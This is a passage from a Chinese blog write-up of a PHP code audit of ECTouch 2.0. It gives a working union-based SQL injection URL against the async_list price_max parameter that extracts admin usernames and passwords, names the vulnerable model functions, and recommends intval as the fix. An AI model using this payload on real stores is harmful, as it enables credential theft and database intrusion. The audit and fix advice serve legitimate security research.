                'single_item' =&gt; ECTouch::view()-&gt;fetch('library/asynclist_info.lbi')
            );
        `}`
        die(json_encode($sayList));
        exit();
    `}`
```

### <a class="reference-link" name="0x10.3%20category%20async_list%20%24price_max%E6%97%A0%E9%99%90%E5%88%B6%E6%B3%A8%E5%85%A5"></a>0x10.3 category async_list $price_max无限制注入

Payload:

`http://127.0.0.1:8888/ecshop/upload/mobile/index.php?c=category&amp;a=async_list&amp;price_max=1.0union select 1,user_name,3,4,5,password,7,8,9,10,11,12,13,14,15,16,17,18,19 from ecs_admin_user order by goods_id asc limit 1%23`

[![](https://p3.ssl.qhimg.com/dm/1024_140_/t01ed8efe081b8ace94.jpg)](https://p3.ssl.qhimg.com/dm/1024_140_/t01ed8efe081b8ace94.jpg)

```
public function async_list()
    `{`
        $this-&gt;parameter();
        $this-&gt;assign('show_marketprice', C('show_marketprice'));
        $this-&gt;page = I('post.page');
        $goodslist = $this-&gt;category_get_goods();
        die(json_encode(array('list' =&gt; $goodslist)));
        exit();
    `}`
```

还有好几处我就不想继续去分析了,你们可以继续去寻找看看,寻找方法看我总结搜索即可。

**总结下这几个注入:**

原因1:`$max $min`这些相关的值没有intval处理,可以利用php弱类型绕过,其他点用intval处理了。神奇+1

原因2:直接拼接变量

(1)`ActivityModel.class.php`

`function category_get_count($children, $brand, $goods, $min, $max, $ext)`

`function category_get_goods`

(2`CategoryModel.class.php`

`function category_get_count`

`function get_category_recommend_goods`

(3)`ExchangeModel.class.php`

`function exchange_get_goods`

`function get_exchange_goods_count`

修复建议:可控变量intval处理



## 0x11 代码审计SQL注入总结

SQL注入没什么总结的,寻找可控,跟踪变量,sql注入三部曲。

但是这次审计改变了我很多看法,以前我总是觉得,有了全局过滤,那么注入应该比较少了,所以我第一次就是抱着这样消极的想法,所以没审计出漏洞,但是后来我听说phpoop师傅也审计过这个cms的前台注入,我一下子干劲就上来了,认真读了代码,果然收获颇丰。

最后介绍下ECTOUCH2.0还可寻找注入漏洞的点,关注下处理变量的函数。

```
154:         $json = new EcsJson;
  155:         $goods = $json-&gt;decode($_POST ['goods']);
```

比如这些,我当时简单读了下

```
function decode($text, $type = 0) `{` // 榛樿?type=0杩斿洖obj,type=1杩斿洖array
        if (empty($text)) `{`
            return '';
        `}` elseif (!is_string($text)) `{`
            return false;
        `}`

        if (EC_CHARSET === 'utf-8' &amp;&amp; function_exists('json_decode')) `{`
            return addslashes_deep_obj(json_decode(stripslashes($text), $type));
        `}`

        $this-&gt;at = 0;
        $this-&gt;ch = '';
        $this-&gt;text = strtr(stripslashes($text), array(
            "r" =&gt; '', "n" =&gt; '', "t" =&gt; '', "b" =&gt; '',
            "x00" =&gt; '', "x01" =&gt; '', "x02" =&gt; '', "x03" =&gt; '',
            "x04" =&gt; '', "x05" =&gt; '', "x06" =&gt; '', "x07" =&gt; '',
            "x08" =&gt; '', "x0b" =&gt; '', "x0c" =&gt; '', "x0e" =&gt; '',
            "x0f" =&gt; '', "x10" =&gt; '', "x11" =&gt; '', "x12" =&gt; '',
            "x13" =&gt; '', "x14" =&gt; '', "x15" =&gt; '', "x16" =&gt; '',
            "x17" =&gt; '', "x18" =&gt; '', "x19" =&gt; '', "x1a" =&gt; '',
            "x1b" =&gt; '', "x1c" =&gt; '', "x1d" =&gt; '', "x1e" =&gt; '',
            "x1f" =&gt; ''
        ));

        $this-&gt;next();
        $return = $this-&gt;val();

        $result = empty($type) ? $return : $this-&gt;object_to_array($return);

        return addslashes_deep_obj($result);
    `}`
```

也是做了过滤,可以考虑下组合之类的,这可能是我进阶代码审计需要学习的了。



## 0x12 感受

从第一次审计没有收获到第二次收获满满的注入点,我感觉到了php代码审计的极大魅力。接下来，因为注入我觉得基本饱和了,所以不打算对注入再进行其他分析啥的,但是我会继续审计其他漏洞,比如xss,逻辑漏洞,xxe(考完试就写这个),这些漏洞我也不知道存不存在，但是我还是会把过程记录下来供你们参考(ps:希望大佬不要介意小菜的垃圾见解,希望大佬多多指点),最后希望回首的时候,这些续集文章能见证我的php代码审计成长之路,come on!
